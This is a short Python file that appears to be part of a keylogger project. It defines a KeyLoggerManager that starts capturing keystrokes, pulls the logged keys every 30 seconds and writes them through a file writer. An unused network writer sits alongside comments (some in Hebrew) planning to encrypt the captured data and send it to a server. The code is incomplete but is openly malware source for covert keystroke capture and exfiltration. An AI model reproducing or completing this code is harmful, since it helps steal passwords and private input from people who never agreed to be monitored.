from the_keylogger import Ikeylogger
from The_filewriter import IWriter
from network_writer import NetworkWriter
from typing import  Optional

import time
  # שניות


class KeyLoggerManager():
    def __init__(self):
        # create listener
        self.keylog=Ikeylogger()
        self.file_writer=IWriter()
        self.PERIOD=float(30)
        self.to_stop=False
        self.networks=NetworkWriter

        # create filewriter
        # create encryptor
          # שניות

    def do_work(self):

        # call listener start

        data_received = self.keylog.get_logged_keys()
        self.file_writer.send_data(str(data_received))


    def run(self):
     #   next_t = time.monotonic()
        self.keylog.start_logging()
        while True:
         #   start = time.monotonic()
            time.sleep(self.PERIOD)
            if self.to_stop:
                self.keylog.stop_logging()
                break
            self.do_work()

          #  next_t += self.PERIOD
           # sleep_for = max(0.0, next_t - time.monotonic())






        # loop while (True or stops after some time???)
        # sleep some time (20 seconds)
        # get data from listener
        # call filewriter function to write data to file
        # call encryptor function to encrypt the file
        # send to server



if __name__=="__main__":
    manager=KeyLoggerManager()
    manager.run()

    input()